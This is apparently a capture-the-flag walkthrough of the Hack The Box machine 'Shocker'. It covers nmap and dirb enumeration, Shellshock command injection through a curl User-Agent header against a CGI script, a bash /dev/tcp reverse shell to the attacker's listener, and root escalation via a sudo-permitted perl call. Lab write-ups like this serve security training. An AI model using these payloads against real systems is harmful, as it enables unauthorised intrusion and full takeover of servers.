# HTB - Shocker    10.10.10.56


- Linux 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 16.04.3 LTS

- Apache/2.4.18 (Ubuntu)
- OpenSSH 7.2p2 Ubuntu 4ubuntu2.2

- Use the box name to identify Shell Shock exploit
- dird : find /cgi-bin/
- dirb : find /cgi-bin/user.sh
- Use shell shock
- use sudo -l


## Walkthrough

- https://medium.com/@andr3w_hilton/htb-shocker-walkthrough-37f1dc6203f3



## NMap

```
# Nmap 7.70 scan initiated Sun Sep 15 13:12:52 2019 as: nmap -sC -sV -A -o enum/nmap_10.10.10.56_recon.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.18 (92%), Linux 4.2 (92%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.8 - 3.11 (91%), Linux 4.4 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   36.35 ms 10.10.14.1
2   36.41 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 15 13:13:08 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
```


## 80

![](images/http:__10.10.10.56:80.png)
```
HTTP/1.1 200 OK
Date: Sun, 15 Sep 2019 11:07:05 GMT
Server: Apache/2.4.18 (Ubuntu)
```

The name is Shocker, we search for a shell shock exploit.
Let search cgi-bin directory for a .sh file

### Dirb

Found http://10.10.10.56:80/cgi-bin/ 

### Shell shock


Use Request header to inject commands
```
# curl -H "User-Agent: () { :; }; /bin/ping 10.10.14.32 -c 2" http://10.10.10.56:80/cgi-bin/user.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>

```
Take 2s to get response.
We have no stdout, but command is executed


```
# curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" http://10.10.10.56:80/cgi-bin/user.sh
```

Get the reverse shell
```
# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.56] 59738
bash: no job control in this shell

shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ 

shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXxxxx 

```
## System
```
$ uname -a
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/issue
Ubuntu 16.04.3 LTS


```


## Escalation

```
$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

$ sudo perl -e 'system("/bin/bash")'
sudo perl -e 'system("/bin/bash")'
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXxx

```


